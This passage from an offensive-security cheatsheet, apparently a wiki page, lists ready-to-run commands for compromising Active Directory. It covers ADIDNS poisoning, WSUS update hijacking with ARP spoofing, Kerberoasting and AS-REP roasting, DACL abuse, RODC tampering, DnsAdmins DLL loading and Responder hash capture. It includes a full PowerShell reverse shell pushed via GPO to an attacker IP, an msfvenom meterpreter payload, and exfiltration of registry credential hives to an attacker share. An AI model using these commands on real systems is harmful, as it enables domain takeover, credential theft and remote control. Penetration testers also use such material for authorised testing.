<p id="bkmrk-for-netexec-it-is--k">For <strong>NetExec</strong> it is <code>-k</code> with credentials to perform the whole Kerberos process and authenticate with the ticket. If a <code>.ccache</code> ticket is already in memory, it is <code>-k --use-kcache</code>.</p>
<p id="bkmrk-for-evil-winrm-it%27s-">For <strong>evil-winrm</strong> it's <code>-r &lt;domain&gt; --spn &lt;SPN_prefix&gt;</code> (default 'HTTP'). The realm must be specified in the file <code>/etc/krb5.conf</code> using this format -&gt; <code>CONTOSO.COM = { kdc = fooserver.contoso.com }</code></p>
<p id="bkmrk-if-the-kerberos-tick">If the Kerberos ticket is in <code>.kirbi</code> format it can be converted like this:</p>
<pre id="bkmrk-ticketconverter.py-t"><code class="language-bash">ticketConverter.py ticket.kirbi ticket.ccache
</code></pre>
<h3 id="bkmrk-adidns-poisoning">ADIDNS poisoning</h3>
<p id="bkmrk-how-to-deal-with-the">How to deal with the <strong>Active Directory Integrated DNS</strong> and redirect the NTLM authentications to us</p>
<ul id="bkmrk-by-default%2C-any-user"><li>By default, any user can create new ADIDNS records</li>
<li>But it is not possible to change or delete a record we are not owning</li>
<li>By default, the DNS will be used first for name resolution in the AD, and then NBT-NS, LLMNR, etc</li>
</ul><p id="bkmrk-if-the-wilcard-recor">If the <strong>wilcard record</strong> (*) doesn't exist, we can create it and all the authentications will arrive on our listener, except if the WPAD configuration specifically blocks it.</p>
<h4 id="bkmrk-wildcard-attack">Wildcard attack</h4>
<p id="bkmrk-the-char-%2A-can%27t-be-">The char <code>*</code> can't be added via DNS protocol because it will break the request. Since we are in an AD we can modify the DNS via LDAP:</p>
<pre id="bkmrk-%23-check-if-the-%27%2A%27-r"><code class="language-bash"># Check if the '*' record exist
python3 dnstool.py -u "domain.local\user1" -p "password" -a query -r "*" &lt;DNS_IP&gt;

# creates a wildcard record
python3 dnstool.py -u "domain.local\user1" -p "password" -a add -r "*" -d &lt;attacker_IP&gt; &lt;DNS_IP&gt;

# disable a node
python3 dnstool.py -u "domain.local\user1" -p "password" -a remove -r "*" &lt;DNS_IP&gt;

# remove a node
python3 dnstool.py -u "domain.local\user1" -p "password" -a ldapdelete -r "*" &lt;DNS_IP&gt;
</code></pre>
<h3 id="bkmrk-feature-abuse">Feature abuse</h3>
<h4 id="bkmrk-sccm-%2F-mecm---pxe-bo">SCCM / MECM - PXE boot</h4>
<p id="bkmrk-check-the-dedicated-">Check the dedicated <a href="https://hideandsec.sh/books/cheatsheets-82c/page/system-center-configuration-manager">page</a>.</p>
<h4 id="bkmrk-wsus">WSUS</h4>
<p id="bkmrk-spoof-the-wsus-serve"><a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing">Spoof the WSUS server and hijack the update</a> if the updates are pushed through HTTP and not HTTPS</p>
<pre id="bkmrk-%23find-the-wsus-serve"><code class="language-bash">#Find the WSUS server with the REG key
reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'user1':'password'@server.domain.local query -keyName 'HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver'

#Setup the fake WSUS server
python3.exe pywsus.py --host &lt;network_interface&gt; --port 8530 --executable ./PsExec64.exe --command '/accepteula /s cmd.exe /c "net user usser1 Password123! /add &amp;&amp; net localgroup Administrators user1 /add"'
</code></pre>
<p id="bkmrk-and-arp-spoofing-wit">And ARP spoofing with bettercap and a <code>wsus_spoofing.cap</code> like this:</p>
<pre id="bkmrk-%23-quick-recon-of-the-0"><code class="language-go"># quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff

# start the modules
any.proxy on
arp.spoof on
net.sniff on
</code></pre>
<pre id="bkmrk-bettercap---iface-%3Cn"><code class="language-bash">bettercap --iface &lt;network_interface&gt; --caplet wsus_spoofing.cap
</code></pre>
<p id="bkmrk-now-wait-for-update-">Now wait for update verification or manually trigger with a GUI access on the machine.</p>
<h4 id="bkmrk-pre-windows-2000-com">Pre-Windows 2000 Computers</h4>
<p id="bkmrk-everything-is-explai">Everything is explained <a href="https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers">here</a>.</p>
<h2 id="bkmrk-domain-privesc">Domain Privesc</h2>
<h3 id="bkmrk-kerberoast">Kerberoast</h3>
<p id="bkmrk-the-kerberos-service">The Kerberos service ticket (ST) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. Password hashes of service accounts could be used to create Silver Tickets.</p>
<h4 id="bkmrk-find-user-with-spn">Find user with SPN</h4>
<pre id="bkmrk-getuserspns.py--dc-i"><code class="language-bash">GetUserSPNs.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#In another domain through trust
GetUserSPNs.py -dc-ip &lt;DC_IP&gt; -target-domain &lt;target_domain&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-request-in-jtr%2Fhashc">Request in JtR/Hashcat format</h4>
<pre id="bkmrk-getuserspns.py--dc-i-0"><code class="language-bash">GetUserSPNs.py -dc-ip &lt;DC_IP&gt; -request -outputfile hash.txt domain.local/user1:password
</code></pre>
<p id="bkmrk-force-rc4-downgrade-">Force RC4 downgrade even on AES enabled targets to obtain tickets more easy to crack:</p>
<pre id="bkmrk-pypykatz-kerberos-sp"><code class="language-bash">pypykatz kerberos spnroast -d domain.local -t &lt;target_user&gt; -e 23 'kerberos+password://domain.local\user1:password@&lt;DC_IP&gt;'
</code></pre>
<h4 id="bkmrk-crack-the-hash">Crack the hash</h4>
<pre id="bkmrk-john-hash.txt---word"><code class="language-bash">john hash.txt --wordlist=./rockyou.txt

hashcat -m 13100 -a 0 hash.txt rockyou.txt
</code></pre>
<h3 id="bkmrk-kerberoast-with-des">Kerberoast with DES</h3>
<p id="bkmrk-this-attack-is-prese-0">This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-kerberoast-w%2Fo-creds">Kerberoast w/o creds</h3>
<h4 id="bkmrk-without-pre-authenti">Without pre-authentication</h4>
<p id="bkmrk-if-a-principal-can-a">If a principal can authent without pre-authentication (like AS-REP Roasting), it is possible to use it to launch an <strong>AS-REQ request</strong> (for a TGT) and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the <strong>sname</strong> attribut in the <strong>req-body</strong> part of the request. Full explains <a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">here</a>.</p>
<p id="bkmrk-this-pr-must-be-used"><a href="https://github.com/SecureAuthCorp/impacket/pull/1413">This PR</a> must be used for the moment.</p>
<pre id="bkmrk-getuserspns.py--no-p"><code class="language-bash">GetUserSPNs.py -no-preauth &lt;user_w/o_preauth&gt; -usersfile "users.txt" -dc-host &lt;DC_IP&gt; "domain.local"/
</code></pre>
<h4 id="bkmrk-with-mitm">With MitM</h4>
<p id="bkmrk-if-no-principal-with">If no principal without pre-authentication are present, it is still possible to intercept the <strong>AS-REQ requests</strong> on the wire (with ARP spoofing for example), and replay them to kerberoast.</p>
<pre id="bkmrk-ritm--i-%3Cattacker_ip"><code class="language-bash">ritm -i &lt;attacker_IP&gt; -t &lt;target_IP&gt; -g &lt;gateway_to_spoof&gt; -u users.txt
</code></pre>
<h3 id="bkmrk-as-rep-roasting">AS-REP Roasting</h3>
<ul id="bkmrk-if-a-user%27s-useracco"><li>If a user's <strong>UserAccountControl</strong> settings have "Do not require Kerberos preauthentication" enabled (<code>UF_DONT_REQUIRE_PREAUTH</code>) -&gt; Kerberos preauth is disabled -&gt; it is possible to grab user's crackable AS-REP and brute-force it offline.</li>
<li>With sufficient rights (<strong>GenericWrite</strong> or <strong>GenericAll</strong>), Kerberos preauth can be disabled.</li>
</ul><h4 id="bkmrk-enumerate-users">Enumerate users</h4>
<pre id="bkmrk-getnpusers.py--dc-ip"><code class="language-bash">GetNPUsers.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-request-as-rep">Request AS-REP</h4>
<pre id="bkmrk-getnpusers.py--dc-ip-0"><code class="language-bash">GetNPUsers.py -dc-ip &lt;DC_IP&gt; -request -format john domain.local/user1:password
</code></pre>
<p id="bkmrk-it-is-possible-to-fo">It is possible to force DES, if it is allowed. Look at the Active Directory cheatsheet.</p>
<h4 id="bkmrk-crack-the-hash-0">Crack the hash</h4>
<p id="bkmrk-with-john-or-hashcat">With <strong>john</strong> or <strong>hashcat</strong> it could be performed</p>
<h3 id="bkmrk-dacls-attacks">DACLs attacks</h3>
<h4 id="bkmrk-dacls-packages">DACLs packages</h4>
<ul id="bkmrk-owns-object-writedac"><li>
<strong>Owns object</strong>
<ul><li>WriteDacl</li>
</ul></li>
<li>
<strong>GenericAll</strong>
<ul><li>GenericWrite</li>
<li>AllExtendedRights</li>
<li>WriteOwner</li>
</ul></li>
<li>
<strong>GenericWrite</strong>
<ul><li>Self</li>
<li>WriteProperty</li>
</ul></li>
<li>
<strong>AllExtendedRights</strong>
<ul><li>User-Force-Change-Password</li>
<li>DS-Replication-Get-Changes</li>
<li>DS-Replication-Get-Changes-All</li>
<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
</ul></li>
</ul><h4 id="bkmrk-on-any-objects">On any objects</h4>
<h5 id="bkmrk-writeowner">WriteOwner</h5>
<p id="bkmrk-with-this-rights-on-">With this rights on a user it is possible to become the "owner" (<strong>Grant Ownership</strong>) of the account and then change our ACLs against it</p>
<pre id="bkmrk-owneredit.py--new-ow"><code class="language-bash">owneredit.py -new-owner user1 -target user2 -dc-ip &lt;DC_IP&gt; -action write 'domain.local'/'user1':'password'
dacledit.py -action write -target user2 -principal user1 -rights ResetPassword -ace-type allowed -dc-ip &lt;DC_IP&gt; 'domain.local'/'user1':'password'

#And change the password
net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
</code></pre>
<h5 id="bkmrk-writedacl">WriteDacl</h5>
<p id="bkmrk-with-this-rights-we-">With this rights we can modify our ACLs against the target, and give us <strong>GenericAll</strong> for example</p>
<pre id="bkmrk-dacledit.py--action--0"><code class="language-bash">dacledit.py -action write -target user2 -principal user1 -rights FullControl -ace-type allowed -dc-ip &lt;DC_IP&gt; 'domain.local'/'user1':'password'
</code></pre>
<p id="bkmrk-in-case-where-you-ha">In case where you have the right against a container or an OU, it is possible to setup the <strong>Inheritance</strong> flag in the ACE. The child objects will inherite the parent container/OU ACE (except if the object has <code>AdminCount=1</code>)</p>
<pre id="bkmrk-dacledit.py--inherit"><code class="language-bash">dacledit.py -inheritance -action write -target 'CN=Users,DC=domain,DC=local' -principal user1 -rights FullControl -ace-type allowed -dc-ip &lt;DC_IP&gt; 'domain.local'/'user1':'password'
</code></pre>
<h4 id="bkmrk-on-an-user">On an user</h4>
<h5 id="bkmrk-writeproperty">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials"><li>ShadowCredentials</li>
</ul><pre id="bkmrk-pywhisker.py--t-user"><code class="language-bash">pywhisker.py -t user2 -a add -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt; --filename user2
</code></pre>
<ul id="bkmrk-targeted-kerberoasti"><li>Targeted Kerberoasting</li>
</ul><p id="bkmrk-we-can-then-request-">We can then request a ST without special privileges. The ST can then be "<strong>Kerberoasted</strong>".</p>
<pre id="bkmrk-getuserspns.py--requ"><code class="language-bash">GetUserSPNs.py -request-user user2 -dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<p id="bkmrk-new-spn-must-be-uniq"><strong>New SPN must be unique in the domain</strong></p>
<pre id="bkmrk-%23set-spn-on-all-the-"><code class="language-bash">#Set SPN on all the possible users, request the ticket and delete the SPN
targetedKerberoast.py -u user1 -p password -d domain.local --only-abuse
</code></pre>
<h5 id="bkmrk-user-force-change-pa">User-Force-Change-Password</h5>
<p id="bkmrk-with-enough-permissi">With enough permissions on a user, we can change his password</p>
<pre id="bkmrk-net-rpc-password-use"><code class="language-bash">net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
</code></pre>
<h4 id="bkmrk-on-a-computer">On a computer</h4>
<h5 id="bkmrk-writeproperty-0">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials-0"><li>ShadowCredentials</li>
</ul><pre id="bkmrk-pywhisker.py--t-comp"><code class="language-bash">pywhisker.py -t computer$ -a add -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt; --filename user2
</code></pre>
<ul id="bkmrk-kerberos-rbcd"><li>Kerberos RBCD</li>
</ul><h5 id="bkmrk-allextendedrights">AllExtendedRights</h5>
<ul id="bkmrk-readlapspassword"><li>ReadLAPSPassword</li>
</ul><pre id="bkmrk-nxc-ldap-%3Cdc_ip%3E--u-"><code class="language-bash">nxc ldap &lt;DC_IP&gt; -u user1 -p password -M laps -o computer="&lt;target&gt;"
</code></pre>
<ul id="bkmrk-readgmsapassword"><li>ReadGMSAPassword</li>
</ul><pre id="bkmrk-ldeep-ldap--u-user1--12"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; gmsa
</code></pre>
<h4 id="bkmrk-on-a-rodc">On a RODC</h4>
<h5 id="bkmrk-genericwrite">GenericWrite</h5>
<ul id="bkmrk-obtain-local-admin-a"><li>Obtain local admin access</li>
</ul><p id="bkmrk-change-the-managedby">Change the <code>managedBy</code> attribute value and add a controlled user. He will automatically gain admin rights.</p>
<ul id="bkmrk-retrieve-tiers-0-acc"><li>Retrieve Tiers 0 account's NT hashes</li>
</ul><p id="bkmrk-it-is-possible-to-mo">It is possible to modify the <code>msDS-NeverRevealGroup</code> and <code>msDS-RevealOnDemandGroup</code> lists on the RODC to allow Tiers 0 accounts to authenticate, and then forge RODC Golden Tickets for them to access other parts of the AD.</p>
<pre id="bkmrk-powerview-domain.loc"><code class="language-bash">powerview domain.local/user1:Password123@RODC-server.domain.local

#First, add a domain admin account to the msDS-RevealOnDemandGroup attribute
#Then, append the Allowed RODC Password Replication Group group
PV &gt; Set-DomainObject -Identity RODC-server$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=domain,DC=local'
PV &gt; Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'

#If needed, remove the admin from the msDS-NeverRevealGroup attribute
PV &gt; Set-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup
</code></pre>
<h5 id="bkmrk-writeproperty-1">WriteProperty</h5>
<p id="bkmrk-writeproperty-on-the"><strong>WriteProperty</strong> on the <code>msDS-NeverRevealGroup</code> and <code>msDS-RevealOnDemandGroup</code> lists is sufficient to modify them. Obtain the <code>krbtgt_XXXXX</code> key is still needed to forge RODC Golden Ticket.</p>
<pre id="bkmrk-powerview-domain.loc-0"><code class="language-bash">powerview domain.local/user1:Password123@RODC-server.domain.local

#First, add a domain admin account to the msDS-RevealOnDemandGroup attribute
#Then, append the Allowed RODC Password Replication Group group
PV &gt; Set-DomainObject -Identity RODC-server$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=domain,DC=local'
PV &gt; Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'

#If needed, remove the admin from the msDS-NeverRevealGroup attribute
PV &gt; Set-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup
</code></pre>
<h4 id="bkmrk-on-a-group">On a group</h4>
<h5 id="bkmrk-writeproperty%2Fallext">WriteProperty/AllExtendedRights/GenericWrite Self</h5>
<p id="bkmrk-with-one-of-this-rig">With one of this rights we can add a new member to the group</p>
<pre id="bkmrk-net-rpc-group-addmem"><code class="language-bash">net rpc group addmem &lt;group&gt; user2 -U domain.local/user1%password -S &lt;DC_IP&gt;
</code></pre>
<h4 id="bkmrk-on-a-gpo">On a GPO</h4>
<h5 id="bkmrk-writeproperty-on-a-g">WriteProperty on a GPO</h5>
<ul id="bkmrk-we-can-update-a-gpo-"><li>We can update a GPO with a scheduled task for example to obtain a reverse shell</li>
</ul><pre id="bkmrk-.%2Fpygpoabuse.py-doma"><code class="language-bash">./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "&lt;GPO_ID&gt;" -powershell -command "\$client = New-Object System.Net.Sockets.TCPClient('attacker_IP',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '&gt; ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" -taskname "The task" -description "Important task" -user
</code></pre>
<ul id="bkmrk-create-a-local-admin"><li>Create a local admin</li>
</ul><pre id="bkmrk-.%2Fpygpoabuse.py-doma-0"><code class="language-bash">./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "&lt;GPO_ID&gt;"
</code></pre>
<h5 id="bkmrk-manage-group-policy-">Manage Group Policy Links</h5>
<p id="bkmrk-whith-this-right-or-">Whith this right or <code>GenericWrite</code> on a GPO we can manipulate its <code>gPLink</code> attribute in order to apply an evil GPO to all the children of a descendant OU, even the ones with <code>adminCount=1</code>.</p>
<p id="bkmrk-all-the-explains-abo">All the explains about this attack are presented <a href="https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory">here</a>. The attack will defer if the final target is a user or a machine account.</p>
<h6 id="bkmrk-machine">Machine</h6>
<ul id="bkmrk-create-a-new-windows"><li>Create a new Windows Server virtual machine connected to the network and install the domain controler features on it. Register it under a subdomain of the current domain (<code>evil.domain.local</code>)</li>
<li>Create an empty GPO on this DC</li>
<li>Reset the machine account password (to remove the unprintable characters)</li>
</ul><pre id="bkmrk-reset-computermachin"><code class="language-powershell">Reset-ComputerMachinePassword
</code></pre>
<ul id="bkmrk-stop-the-antivirus-a"><li>Stop the antivirus and dump the LSASS to retrieve the password</li>
</ul><pre id="bkmrk-lsassy--d-%27evil.doma"><code class="language-bash">lsassy -d 'evil.domain.local' -u administrator -p password &lt;evil_DC_IP&gt;
</code></pre>
<ul id="bkmrk-create-a-new-compute"><li>Create a new computer account on the target domain with a <code>LDAP</code> SPN and the same password as the created DC</li>
</ul><pre id="bkmrk-python3-addcomputer_"><code class="language-bash">python3 addcomputer_LDAP_spn.py -computer-name EVIL -computer-pass &lt;DC_PASS&gt; 'domain.local'/user1:password
</code></pre>
<ul id="bkmrk-create-a-new-dns-rec"><li>Create a new DNS record on the target domain to point the evil subdomain to the attacker machine</li>
</ul><pre id="bkmrk-python3-dnstool.py--"><code class="language-bash">python3 dnstool.py -u 'domain.local\user1' -p password -r 'evil' -a add -d &lt;attacker_IP&gt; &lt;DC_IP&gt;
</code></pre>
<ul id="bkmrk-configure-the-ouned."><li>Configure the OUned.py tool with the following <a href="https://github.com/synacktiv/OUned?tab=readme-ov-file#configuration-file">example</a>. The <code>[SMB]</code> section must be setup to <code>embedded</code> and just a share name</li>
<li>Run OUned.py</li>
</ul><pre id="bkmrk-sudo-python3-ouned.p"><code class="language-bash">sudo python3 OUned.py --config config.ini
</code></pre>
<h6 id="bkmrk-user">User</h6>
<ul id="bkmrk-similarly%2C-create-an"><li>Similarly, create an evil domain controler and a computer account with a <code>LDAP</code> SPN</li>
<li>Create a second evil DC with the same domain as the target domain (<code>domain.local</code>). As the first evil DC, reset and retrieve its password</li>
<li>Create a new SMB share on the second evil DC</li>
</ul><pre id="bkmrk-new-smbshare--name-%22"><code class="language-powershell">New-SmbShare -Name "evil" -Path "C:\Evil"
Grant-SmbShareAccess -Name "evil" -AccountName "DOMAIN.LOCAL\administrator" -AccessRight Full
</code></pre>
<ul id="bkmrk-create-a-new-compute-0"><li>Create a new computer account on the target domain with the <code>HOST</code> SPN and add a DNS record resolving this machine to the attacker IP</li>
</ul><pre id="bkmrk-python3-addcomputer."><code class="language-bash">python3 addcomputer.py -method LDAPS -computer-name EVIL2 -computer-pass &lt;DC2_PASS&gt; 'domain.local'/user1:password
python3 dnstool.py -u 'domain.local\user1' -p password -r 'evil2' -a add -d &lt;attacker_IP&gt; &lt;DC_IP&gt;
</code></pre>
<ul id="bkmrk-configure-the-ouned.-0"><li>Configure the OUned.py tool with the following <a href="https://github.com/synacktiv/OUned?tab=readme-ov-file#configuration-file">example</a>. The <code>[SMB]</code> section must be setup to <code>forwarded</code> with the other information setup</li>
<li>Run OUned.py</li>
</ul><pre id="bkmrk-sudo-python3-ouned.p-0"><code class="language-bash">sudo python3 OUned.py --config config.ini
</code></pre>
<h4 id="bkmrk-on-an-ou">On an OU</h4>
<h5 id="bkmrk-genericwrite-0">GenericWrite</h5>
<p id="bkmrk-with-at-least-generi">With at least <strong>GenericWrite</strong> on an OU, it it possible to perform the same attacks presented in the GPO section with <strong>Manage Group Policy Links</strong>.</p>
<h4 id="bkmrk-on-the-domain%2Fforest">On the domain/forest</h4>
<h5 id="bkmrk-ds-replication-get-c">DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</h5>
<p id="bkmrk-we-can-dcsync">We can <strong>DCSync</strong></p>
<h5 id="bkmrk-ds-replication-get-c-0">DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set</h5>
<p id="bkmrk-it-is-possible-to-re">It is possible to realize a <strong>DirSync</strong> attack, as presented <a href="https://simondotsh.com/infosec/2022/07/11/dirsync.html">here</a>. This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-account-operators">Account Operators</h3>
<p id="bkmrk-the-members-of-this-">The members of this group can add and modify all the non admin users and groups. Since <strong>LAPS ADM</strong> and <strong>LAPS READ</strong> are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password. They also can manage the <strong>Server Operators</strong> group members which can authenticate on the DC.</p>
<h4 id="bkmrk-add-user-to-laps-gro">Add user to LAPS groups</h4>
<pre id="bkmrk-net-rpc-group-addmem-0"><code class="language-bash">net rpc group addmem 'LAPS ADM' user2 -U domain.local/user1%password -S &lt;DC_IP&gt;
net rpc group addmem 'LAPS READ' user2 -U domain.local/user1%password -S &lt;DC_IP&gt;
</code></pre>
<h4 id="bkmrk-read-laps-password">Read LAPS password</h4>
<pre id="bkmrk-nxc-ldap-%3Cdc_ip%3E--u--0"><code class="language-bash">nxc ldap &lt;DC_IP&gt; -u user2 -p password -M laps -o computer="&lt;target&gt;"
</code></pre>
<h3 id="bkmrk-dnsadmins">DnsAdmins</h3>
<ul id="bkmrk-it-is-possible-for-t"><li>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</li>
<li>In case the DC also serves as DNS, this will provide us escalation to DA.</li>
<li>Need privileges to restart the DNS service.</li>
</ul><pre id="bkmrk-%23generate-the-dll-ms"><code class="language-bash">#Generate the DLL
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker_IP&gt; LPORT=1234 -f dll &gt; rev.dll

#On the DNS machine, modify the server conf
nxc smb &lt;target&gt; -u user1 -p password -X "dnscmd.exe /config /serverlevelplugindll \\&lt;share_SMB&gt;\rev.dll"

#### Restart DNS
services.py 'domain.local'/'user1':'password'@&lt;DNS_server&gt; stop dns
services.py 'domain.local'/'user1':'password'@&lt;DNS_server&gt; start dns
</code></pre>
<h3 id="bkmrk-schema-admins">Schema Admins</h3>
<p id="bkmrk-these-group-members-">These group members can change the "<em>schema</em>" of the AD. It means they can change the ACLs on the objects that will be created <strong>IN THE FUTUR</strong>. If we modify the ALCs on the group object, only the futur group will be affected, not the ones that are already present.</p>
<p id="bkmrk-this-attack-is-prese-1">This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-backup-operators">Backup Operators</h3>
<p id="bkmrk-can-generally-log-in">Can <em>generally</em> log in on any machines of the domain.</p>
<h4 id="bkmrk-file-system-backup">File system backup</h4>
<p id="bkmrk-can-backup-the-entir">Can backup the <strong>entire file system</strong> of a machine (DC included) and have full read/write rights on the backup.</p>
<p id="bkmrk-to-backup-a-folder-c">To backup a folder content:</p>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--4"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password -X "robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E"
</code></pre>
<p id="bkmrk-to-backup-with-disks">To backup with <strong>Diskshadow + Robocopy</strong>:</p>
<ul id="bkmrk-create-a-script.txt-"><li>Create a <code>script.txt</code> file to backup with Diskshadow and upload it on the target</li>
</ul><pre id="bkmrk-set-verbose-onx-set-"><code>set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
</code></pre>
<ul id="bkmrk-backup-with-diskshad"><li>Backup with <code>diskshadow /s script.txt</code> in the <code>netexec</code> command parameter</li>
<li>Retrieve the backup with <strong>robocopy</strong> and send the NTDS file in the current folder : <code>robocopy /b E:\Windows\ntds . ntds.dit</code> (still with NXC)</li>
<li>Then retrieve the SYSTEM registry hive to decrypt and profit <code>reg save hklm\system c:\temp\system</code> (always)</li>
</ul><h4 id="bkmrk-registry-read-rights">Registry read rights</h4>
<p id="bkmrk-the-backup-operators">The <strong>Backup Operators</strong> can read all the machines registry</p>
<pre id="bkmrk-reg.py--dc-ip-%3Cdc_ip"><code class="language-bash">reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'backup$':'Password123'@server.domain.local query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

#Backup the SAM, SECURITY and SYSTEM registry keys
reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'backup$':'Password123'@server.domain.local backup -o \\&lt;attacker_IP&gt;\share
</code></pre>
<h4 id="bkmrk-gpos-read%2Fwrite-righ">GPOs read/write rights</h4>
<p id="bkmrk-normally-the-backup-">Normally the <strong>Backup Operators</strong> can read and rights all the domain and DC GPOs with <strong>robocopy</strong> in <strong>backup</strong> mode</p>
<ul id="bkmrk-found-the-interestin"><li>Found the interesting GPO with <code>Get-NetGPO</code> . For example <strong>Default Domain Policy</strong> in the Domain Controller policy</li>
<li>Get the file at the path <code>\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code> and add whatever you want in it</li>
<li>Write the file with <strong>robocopy</strong>:</li>
</ul><pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--5"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password -X 'robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB'
</code></pre>
<h3 id="bkmrk-key-admins">Key Admins</h3>
<p id="bkmrk-members-of-this-grou">Members of this group can perform <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-on-a-computer">Shadow Credentials</a> attacks against any objects, including the domain controllers.</p>
<h3 id="bkmrk-ad-recycle-bin">AD Recycle Bin</h3>
<p id="bkmrk-members-of-this-grou-0">Members of this group can recover deleted objects from the Active Directory, just like in a recycle bin for files, when the feature is enabled. These objects can sometimes have interesting properties.</p>
<p id="bkmrk-this-attacke-is-pres">This attacke is presented in the Active Directory cheatsheet.</p>
<h2 id="bkmrk-authentication-captu">Authentication capture, coerce and relay</h2>
<h3 id="bkmrk-capture%2C-coerce-and-">Capture, coerce and leak</h3>
<p id="bkmrk-different-ways-to-ob">Different ways to obtain and catch NTLM authentications and retrieve a NTLM response.</p>
<h4 id="bkmrk-responder">Responder</h4>
<p id="bkmrk-change-the-authentic">Change the authentication challenge to <code>1122334455667788</code> in the Responder conf file in order to obtain an easily crackable hash if <strong>NTLMv1</strong> is used.</p>
<pre id="bkmrk-sed--i-%27s%2F-random%2F-1"><code class="language-bash">sed -i 's/ Random/ 1122334455667788/g' Responder/Responder.conf
</code></pre>
<p id="bkmrk-catch-all-the-possib">Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):</p>
<pre id="bkmrk-%23-responder-with-wpa"><code class="language-bash"># Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose
responder -I interface_to_use -wPdDv
</code></pre>
<p id="bkmrk-force-ntlm-downgrade">Force NTLM downgrade to NTLMv1 (will break the authentications if v1 is disabled on the machine):</p>
<pre id="bkmrk-%23---disable-ess-will"><code class="language-bash"># --disable-ess will disable the SSP, not always usefull
responder -I interface_to_use -wdDv --lm --disable-ess
</code></pre>
<p id="bkmrk-ntlmv1-response-can-"><strong>NTLMv1</strong> response can be cracked on <a href="https://crack.sh/">crash.sh</a>.</p>
<h4 id="bkmrk-leak-files">Leak Files</h4>
<p id="bkmrk-with-write-rights-on">With write rights on a SMB share, it is possible to drop a <code>.lnk</code> or <code>.scf</code> file to grab some user hashes:</p>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--6"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password -M slinky -o SERVER=&lt;attacker_SMB_share_IP&gt; -o NAME=&lt;file_name&gt;
nxc smb &lt;target&gt; -u user1 -p password -M scuffy -o SERVER=&lt;attacker_SMB_share_IP&gt; -o NAME=&lt;file_name&gt;
#To clean
